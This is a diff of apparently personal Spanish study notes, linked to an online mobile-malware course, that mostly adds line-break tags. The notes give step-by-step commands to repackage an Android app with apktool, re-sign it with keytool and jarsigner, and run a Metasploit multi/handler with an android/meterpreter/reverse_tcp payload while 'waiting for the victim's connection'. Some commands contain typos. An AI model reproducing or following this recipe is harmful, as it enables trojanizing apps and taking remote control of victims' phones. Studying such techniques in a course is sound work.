@@ -15,29 +15,29 @@ cat AndroidManifest.xml | grep "uses-permisoin"<br>
 en metaexploid 
 <br>copiar todos pernisos en AndroidManifest.xmlAndroidManifest.xml
 <br>apktool b 100sonidos
-crea la compliacion
+crea la compliacion<br>
 
-generar genkey
-keytool -genkey -v -keystore 100sonidos.keustore -alias 100sonidos -keyalg RSA -keysize 2048 -validity 10000
-pide password
-generamos certificado 
-pasamos el certificado a la palicacion original 
-jarsigner -verbose -sigalg SHA1withRSA -d igestalg SHA1 -keystore 100sonidos.keystore  100sonidos.apk 100sonidos<br>
+generar genkey<br>
+keytool -genkey -v -keystore 100sonidos.keustore -alias 100sonidos -keyalg RSA -keysize 2048 -validity 10000<br>
+pide password<br>
+generamos certificado <br>
+pasamos el certificado a la palicacion original <br>
+jarsigner -verbose -sigalg SHA1withRSA -d igestalg SHA1 -keystore 100sonidos.keystore  100sonidos.apk 100sonidos<br><br>
 
---iniciar consola em metaexploid comando msfconsole
---esperamos conexion victima
---usamos multi/handler 
-use multi/handler
---usamos payload 
-set payload android/meterpreter/reverse_tcp
-configurar puerto usado set LPORT 4545
-SET LHOST "DIRECCION IP"
+--iniciar consola em metaexploid comando msfconsole<br>
+--esperamos conexion victima<br>
+--usamos multi/handler <br>
+use multi/handler<br>
+--usamos payload <br>
+set payload android/meterpreter/reverse_tcp<br>
+configurar puerto usado set LPORT 4545<br>
+SET LHOST "DIRECCION IP"<br>
 
---ESTA PREPARADO PARA LA CONEXION DE LA VICTIMA
+--ESTA PREPARADO PARA LA CONEXION DE LA VICTIMA<br>
 
 
 
- 
+ https://platzi.com/clases/1864-malware-moviles/27740-verificacion-de-resultados/
 
 <br># Mobile Security Framework (MobSF)<br>
 Version: v3.8 beta<br>
